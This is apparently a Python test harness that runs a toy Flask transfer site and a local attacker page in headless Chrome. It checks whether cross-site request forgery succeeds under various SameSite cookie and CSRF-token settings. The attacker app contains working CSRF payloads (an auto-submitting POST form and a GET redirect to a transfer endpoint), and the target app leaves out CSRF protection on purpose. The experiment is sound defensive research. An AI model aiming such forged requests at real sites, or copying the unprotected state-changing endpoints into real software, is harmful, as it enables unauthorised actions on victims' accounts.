import sys, os; sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from fl import *
from fl import app as mkapp
tee('f122'); R = {}
import requests
API = '''
import os
from flask import Flask, session, request, jsonify, render_template_string
from flask_wtf.csrf import CSRFProtect, generate_csrf
app = Flask(__name__); app.config['SECRET_KEY'] = 'k' * 32
ss = os.environ['SAMESITE']; app.config['SESSION_COOKIE_SAMESITE'] = None if ss == 'unset' else ss; app.config['SESSION_COOKIE_SECURE'] = os.environ['SECURE'] == '1'
if os.environ['CSRF'] == '1': CSRFProtect(app)
EVIL = os.environ['EVIL']
STATE = {'balance': 1000, 'transfers': [], 'attempts': []}
@app.after_request
def rec(r):
    if request.path.startswith('/transfer'): STATE['attempts'].append({'method': request.method, 'path': request.path, 'cookie_user': session.get('u'), 'status': r.status_code, 'sec_fetch_site': request.headers.get('Sec-Fetch-Site')})
    return r
@app.get('/a')
def a():
    return """<!doctype html><script>fetch('/login', {method: 'POST', headers: {'X-CSRFToken': '%s'}}).then(() => { location = '%s/evil?kind=' + new URLSearchParams(location.search).get('kind'); });</script>""" % (generate_csrf() if os.environ['CSRF'] == '1' else '', EVIL)
@app.post('/login')
def login(): session['u'] = 'victim'; return 'ok'
@app.post('/transfer')
def transfer():
    if not session.get('u'): return 'not logged in', 401
    STATE['balance'] -= int(request.form['amount']); STATE['transfers'].append(request.form['to']); return 'done'
@app.get('/transfer-get')
def transfer_get():
    if not session.get('u'): return 'not logged in', 401
    STATE['balance'] -= int(request.args['amount']); STATE['transfers'].append(request.args['to']); return 'done'
@app.get('/state')
def state(): return jsonify(STATE)
'''
EVILP = '''
import os
from flask import Flask, request
app = Flask(__name__); API = os.environ['API_ORIGIN']
@app.get('/evil')
def evil():
    if request.args.get('kind') == 'get': return "<!doctype html><script>location.href = '%s/transfer-get?to=attacker&amount=100';</script>" % API
    return "<!doctype html><form id=f method=POST action='%s/transfer'><input name=to value=attacker><input name=amount value=100></form><script>document.getElementById('f').submit();</script>" % API
'''
CHROME = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
cases = [('SameSite=Lax(显式写明),无 CSRF 防护,自动提交 POST 表单', 'Lax', '0', '0', 'post'), ('SameSite 未设置(Chrome 当 Lax),无 CSRF 防护,恶意页面自动提交 POST 表单', 'unset', '0', '0', 'post'), ('SameSite 未设置,无 CSRF 防护,恶意页面顶级导航到 GET 转账接口', 'unset', '0', '0', 'get'), ('SameSite=None + Secure,无 CSRF 防护,自动提交 POST 表单', 'None', '1', '0', 'post'), ('SameSite=None + Secure,开了 CSRFProtect,自动提交 POST 表单', 'None', '1', '1', 'post'), ('SameSite=None + Secure,开了 CSRFProtect,导航到 GET 转账接口', 'None', '1', '1', 'get')]
print('== 受害者已登录 127.0.0.1 上的转账站点,随后被带到 localhost 上的恶意页面(跨站),恶意页面发起转账请求(真实无头 Chrome)')
R['cases'] = {}
for label, ss, sec, csrf, kind in cases:
    p2 = free_port(); p1 = free_port(); a_origin = f'http://127.0.0.1:{p2}'; e_origin = f'http://localhost:{p1}'
    da = mkapp('f122a', {'app.py': API}); de = mkapp('f122e', {'app.py': EVILP})
    with Server(da, ['gunicorn', '-b', f'127.0.0.1:{p2}', '-w', '1', 'app:app'], port=p2, SAMESITE=ss, SECURE=sec, CSRF=csrf, EVIL=e_origin):
        with Server(de, ['gunicorn', '-b', f'127.0.0.1:{p1}', '-w', '1', 'app:app'], port=p1, API_ORIGIN=a_origin):
            prof = FT / 'f122chrome'; shutil.rmtree(prof, ignore_errors=True)
            pc = subprocess.Popen([CHROME, '--headless=new', '--disable-gpu', '--no-first-run', f'--user-data-dir={prof}', f'{a_origin}/a?kind={kind}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            st = {}; t0 = time.time()
            while time.time() - t0 < 25:
                time.sleep(0.5)
                try: st = requests.get(f'{a_origin}/state', timeout=2).json()
                except Exception: continue
                if st.get('attempts'): time.sleep(1.0); st = requests.get(f'{a_origin}/state', timeout=2).json(); break
            try: os.killpg(pc.pid, signal.SIGKILL)
            except ProcessLookupError: pass
            pc.wait()
    at = st.get('attempts', [])
    print(f'  [{label}]'); print(f'     服务端是否收到转账请求: {bool(at)} | 请求详情: {[{k: v for k, v in x.items() if k in ("method", "cookie_user", "status", "sec_fetch_site")} for x in at]}'); print(f'     转账是否成功: {st.get("transfers", [])} | 余额 {st.get("balance")}')
    R['cases'][label] = dict(attempts=at, transfers=st.get('transfers', []), balance=st.get('balance'))
save('f122', R)
